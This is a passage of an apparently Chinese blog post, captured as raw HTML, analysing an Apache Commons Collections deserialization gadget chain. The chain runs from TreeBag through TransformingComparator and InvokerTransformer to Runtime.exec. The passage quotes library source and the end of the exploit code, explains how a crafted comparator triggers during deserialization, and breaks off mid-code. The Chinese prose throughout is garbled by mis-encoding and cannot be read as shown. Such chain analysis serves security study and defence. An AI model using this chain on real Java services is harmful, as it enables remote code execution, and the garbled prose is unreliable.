</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=expæ„é€ åˆ†æ-3>Expæ„é€ åˆ†æ</h4><h5 id=åˆ©ç”¨é“¾å±•ç¤º-1>åˆ©ç”¨é“¾å±•ç¤º</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Gadget</span><span class=w> </span><span class=n>chain</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>TreeBag</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>					</span><span class=n>TransformingComparator</span><span class=p>.</span><span class=na>compare</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>						</span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>							</span><span class=n>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>								</span><span class=n>Runtime</span><span class=p>.</span><span class=na>exec</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ä¸»è¦åˆ†æä¸€ä¸‹TreeBagå’ŒPriorityQueueçš„ä¸åŒã€‚</p><h5 id=treebag>TreeBag</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>TreeBag</span><span class=p>(</span><span class=n>Comparator</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>E</span><span class=o>&gt;</span><span class=w> </span><span class=n>comparator</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>TreeMap</span><span class=p>(</span><span class=n>comparator</span><span class=p>));</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>in</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>in</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Comparator</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>E</span><span class=o>&gt;</span><span class=w> </span><span class=n>comp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Comparator</span><span class=p>)</span><span class=n>in</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>doReadObject</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>TreeMap</span><span class=p>(</span><span class=n>comp</span><span class=p>),</span><span class=w> </span><span class=n>in</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¦‚æ³¨é‡Š1å¤„æ‰€ç¤ºï¼ŒTreeBagåˆ›å»ºå®ä¾‹æ—¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªTreeMapå®ä¾‹ï¼Œå¹¶ä¸”å®ƒçš„æ’åºæ–¹æ³•ç”±æˆ‘ä»¬å®šä¹‰ã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨Expä¸­åˆ›å»ºTreeBagä¼ å…¥æˆ‘ä»¬çš„æ¶æ„æ’åºæ–¹æ³•ã€‚</p><p>å¦‚æ³¨é‡Š2å¤„æ‰€ç¤ºï¼ŒTreeBagåœ¨ååºåˆ—åŒ–æ—¶ï¼Œæˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•åŒæ ·ä¹Ÿååºåˆ—åŒ–äº†ã€‚</p><p>æ¥ç€æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹æ³¨é‡Š2å¤„çš„ä»£ç ï¼ŒAbstractMapBag.doReadObject()ã€‚</p><h5 id=abstractmapbag>AbstractMapBag</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>doReadObject</span><span class=p>(</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=n>MutableInteger</span><span class=o>&gt;</span><span class=w> </span><span class=n>map</span><span class=p>,</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>in</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>entrySize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>entrySize</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>E</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>in</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MutableInteger</span><span class=p>(</span><span class=n>count</span><span class=p>));</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>count</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ³¨é‡Š1å¤„æ‰§è¡Œäº†TreeMap.put()ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å¯¹åº”æ–¹æ³•ã€‚</p><h5 id=treemap>TreeMap</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=nf>put</span><span class=p>(</span><span class=n>K</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Entry</span><span class=o>&lt;</span><span class=n>K</span><span class=p>,</span><span class=n>V</span><span class=o>&gt;</span><span class=w> </span><span class=n>t</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>root</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>t</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>compare</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>);</span><span class=w> </span><span class=c1>// type (and possibly null) check</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>root</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Entry</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>modCount</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>cmp</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Entry</span><span class=o>&lt;</span><span class=n>K</span><span class=p>,</span><span class=n>V</span><span class=o>&gt;</span><span class=w> </span><span class=n>parent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// split comparator and comparable paths</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Comparator</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>K</span><span class=o>&gt;</span><span class=w> </span><span class=n>cpr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>comparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cpr</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>parent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>cmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cpr</span><span class=p>.</span><span class=na>compare</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmp</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>t</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>left</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmp</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>t</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>right</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>t</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NullPointerException</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Comparable</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>K</span><span class=o>&gt;</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Comparable</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>K</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span><span class=n>key</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>parent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>cmp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>k</span><span class=p>.</span><span class=na>compareTo</span><span class=p>(</span><span class=n>t</span><span class=p>.</span><span class=na>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmp</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>t</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>left</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmp</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>t</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>right</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>else</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=n>t</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>t</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Entry</span><span class=o>&lt;</span><span class=n>K</span><span class=p>,</span><span class=n>V</span><span class=o>&gt;</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Entry</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=n>parent</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmp</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>parent</span><span class=p>.</span><span class=na>left</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>else</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>parent</span><span class=p>.</span><span class=na>right</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>e</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fixAfterInsertion</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>size</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>modCount</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè§¦å‘äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•ã€‚</p><p>åé¢çš„æµç¨‹åˆ™å’ŒPriorityQueueé“¾ç›¸åŒï¼Œä¸å†èµ˜è¿°ã€‚</p><h4 id=é—®é¢˜è¡¥å……-1>é—®é¢˜è¡¥å……</h4><h5 id=ç”¨tostringåˆå§‹åŒ–>ç”¨toStringåˆå§‹åŒ–</h5><p>Qï¼š</p><p>ä¸ºä»€ä¹ˆExpä¸­çš„<code>InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});</code>â€‹ä¸ç›´æ¥ç”¨<code>InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});</code>â€‹å‘¢ï¼Ÿ</p><p>Aï¼š</p><p>æˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•å…¶å®æ˜¯ä¸èƒ½æ­£å¸¸æ’åºçš„ï¼Œå¦‚æœç”¨newTransformerä½œä¸ºå…¥å‚æ„é€ ï¼Œåˆ™åœ¨Expçš„<code>tb.add(templatesImpl)</code>â€‹å°±ä¼šæŠ¥é”™ï¼ŒåŸå› çœ‹æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=c1>//TreeBagæºç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=n>object</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>comparator</span><span class=p>()</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=n>object</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Comparable</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>(</span><span class=s>&#34;Objects of type &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>object</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; cannot be added to &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;a naturally ordered TreeBag as it does not implement Comparable&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>//AbstractTreeBagæºç </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=n>object</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>object</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=n>object</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nCopies</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>++</span><span class=k>this</span><span class=p>.</span><span class=na>modCount</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>nCopies</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>MutableInteger</span><span class=w> </span><span class=n>mut</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>MutableInteger</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>nCopies</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>mut</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>this</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>object</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MutableInteger</span><span class=p>(</span><span class=n>nCopies</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>mut</span><span class=p>.</span><span class=na>value</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>nCopies</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
